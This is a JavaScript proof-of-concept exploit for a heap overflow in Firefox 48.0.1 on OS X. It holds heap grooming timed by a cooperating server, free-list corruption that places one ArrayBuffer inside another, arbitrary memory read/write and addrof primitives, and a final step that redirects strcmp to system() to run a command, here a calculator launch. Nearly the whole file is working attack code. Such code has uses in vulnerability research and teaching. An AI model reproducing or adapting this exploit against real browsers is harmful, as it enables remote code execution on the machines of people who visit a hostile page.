//
// Proof-of-Concept exploit for CVE-???-???
//
// Essentially, the bug allows us to overflow a 8GB memory region with more or less controlled data.
// We use that to corrupt the free list of an Arena (a structure containing JSObject instances)
// and with that force a newly allocated ArrayBuffer object to be placed inside the inline data
// of another ArrayBuffer object. This gives us an arbitrary read+write primitive.
//

//
// Utility stuff.
//

const KB = 0x400;
const MB = 0x100000;
const GB = 0x40000000;

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

function print(msg) {
    console.log(msg);
    document.body.innerText += msg + '\n';
}

// Tell the server that we have completed our next step and wait
// for it to completes its next step.
function synchronize() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/sync', false);
    // Server will block until the event has been fired
    xhr.send();
}

//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this == other
    this.equals = operation(function(other) {
        for (var i = 0; i < 8; i++) {
            if (this.byteAt(i) != other.byteAt(i))
                return false;
        }
        return true;
    }, 1);

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a << 1
    this.assignLShift1 = operation(function lshift1(a) {
        var highBit = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i);
            bytes[i] = (cur << 1) | highBit;
            highBit = (cur & 0x80) >> 7;
        }
        return this;
    }, 1);

    // this = a >> 1
    this.assignRShift1 = operation(function rshift1(a) {
        var lowBit = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i);
            bytes[i] = (cur >> 1) | lowBit;
            lowBit = (cur & 0x1) << 7;
        }
        return this;
    }, 1);

    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromJSValue = function(bytes) {
    bytes[7] = 0;
    bytes[6] = 0;
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return ~n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

function LShift1(a) {
    return (new Int64()).assignLShift1(a);
}

function RShift1(a) {
    return (new Int64()).assignRShift1(a);
}

function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

function Equals(a, b) {
    return a.equals(b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

//
// Main exploit logic.
//
//     0. Insert a <script> tag to load the payload and eventually trigger the bug.
//
//     1. Wait for the server to send up to 2GB + 1 bytes of data and fill up
//        the chunks freed by realloc() in between.
//        The browser will now have allocated the final (8GB) chunk that we will
//        later overflow from.
//
//     2. Allocate JavaScript arenas (memory regions) containing ArrayBuffers of size 12*8
//        (largest size so the data is still allocated inline behind the object) and hope
//        one of them is placed right after the buffer we are about to overflow.
//        mmap allocates contiguous regions (on macOS at least), so this can only fail if
//        we don't allocate enough memory or if something is allocated in between.
//
//     3. Tell the server to send 0xffffffff bytes in total, completely filling
//        the current chunk
//
//     4. Free one ArrayBuffer in every arena and try to trigger gargabe collection
//        so the arenas are inserted into the free list.
//
//     5. Tell the server to send the remaining data which will trigger the overflow
//        and corrupt the internal free list (indicating which slots are unused) of
//        one of the arenas.
//
//     6. Allocate more ArrayBuffers. If everything worked so far, one of them will be
//        allocated inside the inline data of another ArrayBuffer. Search for that
//        ArrayBuffer.
//
//     7. If found, construct an arbitrary memory read/write primitive. We can
//        now write the data pointer of the inner ArrayBuffer, so this is quite easy.
//
//     8. Repair some things to keep the process alive after our exploit is finished.
//
//     9. Use the memory read/write to gain code execution.
//
//

// Force a GC.
// We must trigger a full GC without triggering a compacting GC,
// as that might fill the holes again...
// Triggering the TOO_MUCH_MALLOC condition seems to do the trick.
function gc() {
    const maxMallocBytes = 128 * MB;
    for (var i = 0; i < 3; i++) {
        var x = new ArrayBuffer(maxMallocBytes);
    }
}

function pwn() {
    // Step 0
    var script = document.createElement('script');
    script.src = location.origin + '/payload.js';
    document.head.appendChild(script);

    // Step 1
    // The server sends a sync reply once it has sent |2**x| + 1 bytes. At that point the browser
    // will do a realloc, doubling the chunksize and freeing the old chunk. We now try to take the
    // freed chunk with an ArrayBuffer.
    var fillBuffers = [];
    for (var sz = 1 * MB; sz <= 4 * GB; sz *= 2) {
        // Wait for the server to send |sz| + 1 bytes
        synchronize();
        if (sz > 1 * GB) {
            for (var i = 0; i < sz / (1 * GB); i++) {
                // Make the buffers slightly smaller to compensate for any
                // other allocations that might happen in between.
                fillBuffers.push(new Uint8Array(1 * GB - 16 * MB));
            }
        } else {
            fillBuffers.push(new Uint8Array(sz));
        }
        print("Filling free chunk of size " + (sz / (1 * MB)) + " MB");
    }

    // Step 2
    // Allocate a large number of ArrayBuffers and hope one of the hosting Arenas/Chunks
    // is placed behind the buffer that will be overflown.
    var buffers = new Array(2000000);
    print("Allocating ArrayBuffers and new arenas...");
    for (var i = 0; i < buffers.length; i++) {
        buffers[i] = new ArrayBuffer(12 * 8);
    }

    // Step 3
    synchronize();

    // Step 4
    // There are 25 ArrayBuffers per Arena, so free one per arena.
    print("ArrayBuffers allocated, making holes and triggering a garbage collection run...");
    for (var i = 5; i < buffers.length; i += 25) {
        buffers[i] = null;
    }
    gc();

    // Step 5
    print("Done. Waiting for Server now...");
    synchronize();

    //
    // Step 6
    //
    // At this point we've (hopefully) corrupted the free list of an arena and have thus created a fake free
    // cell inside the inline data of an ArrayBuffer.
    //
    // Helper function to allocate an ArrayBuffer and tag it with its index
    // so we can later locate it in the newBuffers array.
    function allocateTaggedBuffer(i) {
        var ab = new ArrayBuffer(12 * 8);
        var view = new Uint32Array(ab);
        view[0] = i;
        return ab;
    }

    // Allocate new ArrayBuffers to fill the holes.
    // We allocate some more since there might be (partially) empty arenas left over.
    var numNewBuffers = (buffers.length / 25) * 2;
    var newBuffers = new Array(numNewBuffers);
    for (var i = 0; i < numNewBuffers; i++) {
        newBuffers[i] = allocateTaggedBuffer(i);
    }

    // Now see if we can find one of the newly allocated ArrayBuffers inside one of the
    // previously allocated buffers. |outer| will be the original ArrayBuffer and |inner|
    // will be the ArrayBuffer that has been placed inside |outer|'s inline data.
    print("Looking for buffer...");

    var outer = null;
    var id = -1;
    for (var i = 0; i < buffers.length; i++) {
        if (!buffers[i])
            continue

        outer = new Uint32Array(buffers[i]);
        if (outer[16] != 0) {
            id = outer[16];
            print("Found! ID = " + id);
            outer = outer.buffer;
            break;
        }
    }
    if (id == -1) {
        print("Failed. Dumping fill buffers and exiting...");
        // If we've hit a fill buffer, we need to allocate less of them...
        for (var i = 0; i < fillBuffers.length; i++) {
            print(fillBuffers[i].slice(0, 100).join(' '));
        }
        return;
    }

    // Step 7
    var inner = newBuffers[id];
    var outerByteView = new Uint8Array(outer);
    var innerByteView = new Uint8Array(inner);

    // Determine address of |inner| by reading its data pointer, which points to |inner| + 64
    // since the data is stored inline.
    // The left shift is required because "private" JSValues are stored right-shifted by one bit.
    var addressOfInnerArrayBuffer = Sub(LShift1(new Int64(outerByteView.slice(32, 40)), 1), 64);
    print("Address of inner ArrayBuffer: " + addressOfInnerArrayBuffer.toString());

    // Increase length of |inner|.
    outerByteView[43] = 0x1;
    print("Length of inner ArrayBuffer: " + inner.byteLength);

    // Object to access the process' memory. Very useful.
    var memory = {
        write: function(addr, data) {
            // Set data pointer of |inner|
            outerByteView.set(RShift1(addr).bytes(), 32);
            // Uint8Array's cache the data pointer of the underlying ArrayBuffer
            var innerView = new Uint8Array(inner);
            innerView.set(data);
        },
        read: function(addr, length) {
            // Set data pointer of |inner|
            outerByteView.set(RShift1(addr).bytes(), 32);
            // Uint8Array's cache the data pointer of the underlying ArrayBuffer
            var innerView = new Uint8Array(inner);
            return innerView.slice(0, length);
        },
        readPointer: function(addr) {
            return new Int64(this.read(addr, 8));
        },
        addrof: function(obj) {
            // To leak the address of |obj|, we set it as property of the |inner|
            // ArrayBuffer, then leak that using the existing read() method.
            inner.leakMe = obj;
            var addressOfSlotsArray = this.readPointer(Add(addressOfInnerArrayBuffer, 2*8));
            return Int64.fromJSValue(this.read(addressOfSlotsArray, 8));
        },
    };

    // Step 8
    // Fix following object
    var nextObjectView = new Uint8Array(inner, 32);
    var objectHeader = outerByteView.slice(0, 64);
    nextObjectView.set(objectHeader);
    print("Following Object repaired.");

    // We also need to repair the current arena (so that the free list contains
    // the real free chunk), or else we'll crash during the next GC.
    print("Repairing Arena...");
    var addressOfArena = And(addressOfInnerArrayBuffer, Neg(0x1000));
    var groupPointer = memory.readPointer(addressOfInnerArrayBuffer);
    print("Arena @ " + addressOfArena.toString());
    var addressOfCurrentCell = Add(addressOfArena, 0x60);
    for (var i = 0; i < 25; i++) {
        if (!Equals(memory.readPointer(addressOfCurrentCell), groupPointer)) {
            var offset = i * 160 + 0x60;
            print("Free chunk found @ " + addressOfCurrentCell.toString() + " (offset " + offset + ")");
            var offsetAsBytes = new Uint8Array((new Uint16Array([offset])).buffer);
            memory.write(addressOfArena, offsetAsBytes);
            memory.write(Add(addressOfArena, 2), offsetAsBytes);
        }
        addressOfCurrentCell = Add(addressOfCurrentCell, 160);
    }

    // Step 9
    //
    // This is super hackish: we replace strcmp() with system(), then call
    // date.toLocaleFormat, which at some point does a strcmp with
    // the first argument...

    // Version dependent offsets. We could get around hardcoding these by making
    // use of our memory read primitive. Left as an excercise for the reader.
    // LibC from OS X 10.11.6
    var strcmpToSystem = 0x8b5760b;

    // Firefox 48.0.1 for OS X El Capitan.
    var strcmpOffset = 0x41ad420;
    var maxFuncOffset = 0x2e5ab00;

    // Read the native function pointer of Math.max (Any native function would do)
    // and calculate the base address of XUL from that.
    var moduleBase = memory.readPointer(Add(memory.addrof(Math.max), 40));
    var moduleBase = Sub(moduleBase, maxFuncOffset);
    print("XUL Base address: " + moduleBase.toString());

    var addressOfStrcmpPointer = Add(moduleBase, strcmpOffset);

    var addressOfStrcmp = memory.readPointer(addressOfStrcmpPointer);
    print("strcmp @ " + addressOfStrcmp.toString());

    var addressOfSystem = Add(addressOfStrcmp, strcmpToSystem);
    print("system @ " + addressOfSystem.toString());

    var trigger = new Date();
    //memory.write(addressOfStrcmpPointer, addressOfSystem.bytes());
    trigger.toLocaleFormat("open -a /Applications/Calculator.app");
    //memory.write(addressOfStrcmpPointer, addressOfStrcmp.bytes());

    print("Done.");
}

pwn();
